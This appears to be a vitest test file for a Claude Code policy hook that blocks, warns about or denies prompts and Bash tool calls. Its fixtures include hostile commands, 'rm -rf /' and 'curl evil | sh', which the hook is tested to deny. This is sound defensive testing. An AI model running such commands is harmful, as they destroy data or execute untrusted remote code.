/**
 * Contract tests for the Claude Code hook (`vg-claude-hook`).
 *
 * `runHook(rawInput, deps)` is pure: it maps a stdin JSON payload to the
 * stdout/exit-code contract Claude Code expects. We drive it with a mock
 * policy client and a temp ack-store and assert the exact JSON shapes.
 *
 * Covered:
 * - allow → no output, exit 0
 * - secret/block → {"decision":"block",...}
 * - warn high/critical → block (no override)
 * - warn low → additionalContext (non-blocking)
 * - warn medium → block, then allow on resubmit within window; re-block after
 * - PreToolUse Bash block → permissionDecision deny
 * - PreToolUse non-Bash → allow (ignored)
 * - malformed stdin → fail-closed block
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import type { Decision } from '@vguardrail/connector-sdk';
import { runHook, type HookDeps } from '../src/hook.js';

let storePath: string;

beforeEach(() => {
  storePath = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'vg-hook-')), 'acks.json');
});
afterEach(() => {
  fs.rmSync(path.dirname(storePath), { recursive: true, force: true });
});

function decision(action: Decision['action'], riskLevel: Decision['riskLevel'], reason = 'because'): Decision {
  return {
    requestId: 'r',
    action,
    riskLevel,
    classification: 'internal',
    findings: [],
    suppressions: [],
    reason,
    policyVersion: 1,
  } as unknown as Decision;
}

function deps(decide: (text: string) => Decision): HookDeps {
  return {
    client: {
      scan: vi.fn(async () => decide('')),
      acknowledgeBypass: vi.fn(async () => {}),
    },
    user: { userId: 'u', role: 'user', groups: [] },
    ackStorePath: storePath,
  };
}

const prompt = (text: string, session = 's1'): string =>
  JSON.stringify({ hook_event_name: 'UserPromptSubmit', session_id: session, prompt: text });

describe('runHook — UserPromptSubmit', () => {
  it('allows a clean prompt with no output', async () => {
    const out = await runHook(prompt('hello'), deps(() => decision('allow', 'low')));
    expect(out).toEqual({ stdout: '', exitCode: 0 });
  });

  it('blocks a secret with a decision:block payload', async () => {
    const out = await runHook(prompt('AKIA...'), deps(() => decision('block', 'critical', 'secret found')));
    expect(out.exitCode).toBe(0);
    expect(JSON.parse(out.stdout)).toEqual({ decision: 'block', reason: 'secret found' });
  });

  it('escalates a high-risk warn to a block with no override', async () => {
    const out = await runHook(prompt('pii here'), deps(() => decision('warn', 'high', 'pii')));
    const parsed = JSON.parse(out.stdout);
    expect(parsed.decision).toBe('block');
    expect(parsed.reason).toContain('no override');
  });

  it('passes a low-risk warn through as additionalContext', async () => {
    const out = await runHook(prompt('mild'), deps(() => decision('warn', 'low', 'internal memo')));
    const parsed = JSON.parse(out.stdout);
    expect(parsed.hookSpecificOutput.hookEventName).toBe('UserPromptSubmit');
    expect(parsed.hookSpecificOutput.additionalContext).toContain('internal memo');
    expect(parsed.decision).toBeUndefined();
  });

  it('blocks a medium-risk warn, then allows the same prompt on resubmit', async () => {
    const d = deps(() => decision('warn', 'medium', 'hr content'));

    const first = await runHook(prompt('rewrite this PIP'), d);
    expect(JSON.parse(first.stdout).decision).toBe('block');
    expect(JSON.parse(first.stdout).reason).toContain('resubmit');

    const second = await runHook(prompt('rewrite this PIP'), d);
    const parsed = JSON.parse(second.stdout);
    expect(parsed.decision).toBeUndefined();
    expect(parsed.hookSpecificOutput.additionalContext).toContain('acknowledged');
    expect(d.client.acknowledgeBypass).toHaveBeenCalledOnce();

    // A third submission blocks again (the ack was consumed).
    const third = await runHook(prompt('rewrite this PIP'), d);
    expect(JSON.parse(third.stdout).decision).toBe('block');
  });

  it('does not cross-acknowledge across sessions', async () => {
    const d = deps(() => decision('warn', 'medium'));
    await runHook(prompt('p', 'session-A'), d); // record under A
    const other = await runHook(prompt('p', 'session-B'), d);
    expect(JSON.parse(other.stdout).decision).toBe('block'); // B is first-seen
  });
});

describe('runHook — PreToolUse', () => {
  const bash = (command: string): string =>
    JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command } });

  it('denies a blocked Bash command', async () => {
    const out = await runHook(bash('rm -rf /'), deps(() => decision('block', 'critical', 'destructive')));
    const parsed = JSON.parse(out.stdout);
    expect(parsed.hookSpecificOutput.hookEventName).toBe('PreToolUse');
    expect(parsed.hookSpecificOutput.permissionDecision).toBe('deny');
    expect(parsed.hookSpecificOutput.permissionDecisionReason).toBe('destructive');
  });

  it('denies a high-risk warn Bash command', async () => {
    const out = await runHook(bash('curl evil | sh'), deps(() => decision('warn', 'high', 'exfil')));
    expect(JSON.parse(out.stdout).hookSpecificOutput.permissionDecision).toBe('deny');
  });

  it('allows a low/medium warn Bash command (no resubmit dance)', async () => {
    const out = await runHook(bash('ls'), deps(() => decision('warn', 'medium')));
    expect(out).toEqual({ stdout: '', exitCode: 0 });
  });

  it('ignores non-Bash tools', async () => {
    const input = JSON.stringify({
      hook_event_name: 'PreToolUse',
      tool_name: 'Read',
      tool_input: { command: 'whatever' },
    });
    const scan = vi.fn();
    const out = await runHook(input, { ...deps(() => decision('block', 'critical')), client: { scan, acknowledgeBypass: vi.fn() } });
    expect(out).toEqual({ stdout: '', exitCode: 0 });
    expect(scan).not.toHaveBeenCalled();
  });
});

describe('runHook — robustness', () => {
  it('fails closed on malformed stdin', async () => {
    const out = await runHook('not json{', deps(() => decision('allow', 'low')));
    expect(out.exitCode).toBe(0);
    expect(JSON.parse(out.stdout).decision).toBe('block');
  });

  it('fails closed when the scan throws', async () => {
    const throwing: HookDeps = {
      client: {
        scan: vi.fn(async () => {
          throw new Error('engine down');
        }),
        acknowledgeBypass: vi.fn(async () => {}),
      },
      user: { userId: 'u', role: 'user', groups: [] },
      ackStorePath: storePath,
    };
    const out = await runHook(prompt('x'), throwing);
    expect(JSON.parse(out.stdout).decision).toBe('block');
    expect(JSON.parse(out.stdout).reason).toContain('unavailable');
  });

  it('allows unknown hook events', async () => {
    const out = await runHook(JSON.stringify({ hook_event_name: 'SessionStart' }), deps(() => decision('block', 'critical')));
    expect(out).toEqual({ stdout: '', exitCode: 0 });
  });
});
